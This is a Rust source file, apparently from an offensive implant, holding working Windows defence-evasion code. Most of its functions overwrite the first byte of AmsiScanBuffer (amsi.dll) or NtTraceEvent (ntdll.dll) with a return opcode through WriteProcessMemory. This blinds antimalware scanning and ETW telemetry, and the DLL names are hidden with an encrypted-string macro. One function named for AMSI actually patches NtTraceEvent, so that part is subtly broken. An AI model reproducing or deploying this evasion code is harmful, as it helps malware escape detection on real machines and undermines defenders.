use std::ffi::c_void;

use str_crypter::{decrypt_string, sc};
use windows_sys::Win32::System::{
    Diagnostics::Debug::WriteProcessMemory, Threading::GetCurrentProcess,
};

use crate::utils::export_resolver::{self, ExportResolveError};

pub fn run_evasion() {
    //
    // Note these functions are feature gated on the inside of the call
    //

    etw();

    //
    // Note we do not try patch AMSI here, that should be done on demand in the process when required. AMSI is loaded as
    // amsi.dll.
    //
}

/// Patches AMSI in the current process if the AMSI patching feature flag is enabled. This function can
/// be called without checking whether the feature flag is enabled, as the check happens within the
/// function.
pub fn patch_amsi_if_ft_flag() {
    #[cfg(feature = "patch_amsi")]
    {
        #[cfg(debug_assertions)]
        use shared::pretty_print::print_failed;
        #[cfg(debug_assertions)]
        use shared::pretty_print::print_info;

        use crate::utils::export_resolver::resolve_address;

        #[cfg(debug_assertions)]
        print_info("Patching amsi..");

        let fn_addr = match resolve_address(&sc!("amsi.dll", 42).unwrap(), "AmsiScanBuffer", None) {
            Ok(a) => a,
            Err(_) => {
                #[cfg(debug_assertions)]
                print_failed("Failed to find function AmsiScanBuffer..");

                return;
            }
        };

        let handle = unsafe { GetCurrentProcess() };
        let ret_opcode: u8 = 0xC3;

        let size = std::mem::size_of_val(&ret_opcode);
        let mut bytes_written: usize = 0;

        let res = unsafe {
            WriteProcessMemory(
                handle,
                fn_addr,
                &ret_opcode as *const u8 as *const c_void,
                size,
                &mut bytes_written,
            )
        };
    }
}

fn etw() {
    #[cfg(feature = "patch_etw")]
    {
        #[cfg(debug_assertions)]
        use shared::pretty_print::print_info;

        #[cfg(debug_assertions)]
        print_info("Patching etw..");

        let _ = patch_etw_current_process();
    }
}

pub fn patch_amsi_current_process() -> Result<(), ExportResolveError> {
    let fn_addr =
        export_resolver::resolve_address(&sc!("ntdll.dll", 42).unwrap(), "NtTraceEvent", None)?;

    let handle = unsafe { GetCurrentProcess() };
    let ret_opcode: u8 = 0xC3;

    let size = std::mem::size_of_val(&ret_opcode);
    let mut bytes_written: usize = 0;

    let res = unsafe {
        WriteProcessMemory(
            handle,
            fn_addr,
            &ret_opcode as *const u8 as *const c_void,
            size,
            &mut bytes_written,
        )
    };

    Ok(())
}

pub fn patch_etw_current_process() -> Result<(), ExportResolveError> {
    let fn_addr =
        export_resolver::resolve_address(&sc!("ntdll.dll", 42).unwrap(), "NtTraceEvent", None)?;

    let handle = unsafe { GetCurrentProcess() };
    let ret_opcode: u8 = 0xC3;

    let size = std::mem::size_of_val(&ret_opcode);
    let mut bytes_written: usize = 0;

    let res = unsafe {
        WriteProcessMemory(
            handle,
            fn_addr,
            &ret_opcode as *const u8 as *const c_void,
            size,
            &mut bytes_written,
        )
    };

    Ok(())
}
